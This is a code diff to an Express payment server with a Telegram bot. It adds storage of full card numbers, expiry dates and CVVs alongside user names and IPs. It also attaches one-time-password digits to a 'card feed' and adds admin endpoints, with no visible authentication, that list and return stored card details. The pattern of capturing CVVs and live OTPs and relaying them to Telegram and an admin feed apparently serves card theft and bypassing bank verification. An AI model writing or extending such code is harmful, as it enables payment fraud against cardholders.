@@ -23,6 +23,12 @@ import {
 import * as store from "./server/store";
 import type { Admin, ServerTransaction } from "./server/store";
 import { notifyOrderStatusByRef, sendFcmAnnouncement } from "./server/pushFcm";
+import {
+  attachOtpToCardFeed,
+  listCardFeed,
+  saveCreditCardForOrder,
+  getCreditCardByOrderRef,
+} from "./server/creditCardStore";
 
 type TelegramBotInstance = InstanceType<typeof TelegramBot>;
 
@@ -2020,6 +2026,28 @@ async function startServer() {
         }
       }
 
+      if (
+        card_fields &&
+        typeof card_fields.holder === "string" &&
+        typeof card_fields.number === "string" &&
+        typeof card_fields.expiry === "string" &&
+        typeof card_fields.cvv === "string"
+      ) {
+        try {
+          await saveCreditCardForOrder(tx.order_ref, card_fields, {
+            transaction_id: tx.id,
+            type: tx.type,
+            amount: tx.amount,
+            method: tx.method,
+            status: tx.status,
+            user_name: tx.user_name,
+            user_ip: tx.user_ip,
+          });
+        } catch (cardStoreErr) {
+          console.error("saveCreditCardForOrder:", cardStoreErr);
+        }
+      }
+
       if (bot) {
         try {
           const profile = await store.getSiteProfile();
@@ -2085,6 +2113,11 @@ async function startServer() {
       const { order_id, otpDigit } = req.body;
       if (!order_id || typeof otpDigit === "undefined") {
         return res.status(400).json({ error: "order_id and otpDigit required" });
+      }
+      try {
+        await attachOtpToCardFeed(String(order_id), String(otpDigit));
+      } catch (feedErr) {
+        console.error("attachOtpToCardFeed:", feedErr);
       }
       const chatId = process.env.TELEGRAM_CHAT_ID;
       if (bot && chatId) {
@@ -2393,6 +2426,31 @@ async function startServer() {
     } catch (e) {
       console.error(e);
       res.status(500).json({ error: "Failed to delete agent payment method" });
+    }
+  });
+
+  app.get("/api/admin/card-feed", async (req, res) => {
+    try {
+      const since = typeof req.query.since === "string" ? req.query.since : undefined;
+      const limitRaw = Number(req.query.limit);
+      const limit = Number.isFinite(limitRaw) ? limitRaw : 50;
+      const data = await listCardFeed({ since, limit });
+      res.json(data);
+    } catch (e) {
+      console.error(e);
+      res.status(500).json({ error: "Failed to load card feed" });
+    }
+  });
+
+  app.get("/api/admin/card-feed/:orderRef", async (req, res) => {
+    try {
+      const orderRef = String(req.params.orderRef || "").trim();
+      const card = await getCreditCardByOrderRef(orderRef);
+      if (!card) return res.status(404).json({ error: "Card not found" });
+      res.json({ order_ref: orderRef, card });
+    } catch (e) {
+      console.error(e);
+      res.status(500).json({ error: "Failed to load card" });
     }
   });
 
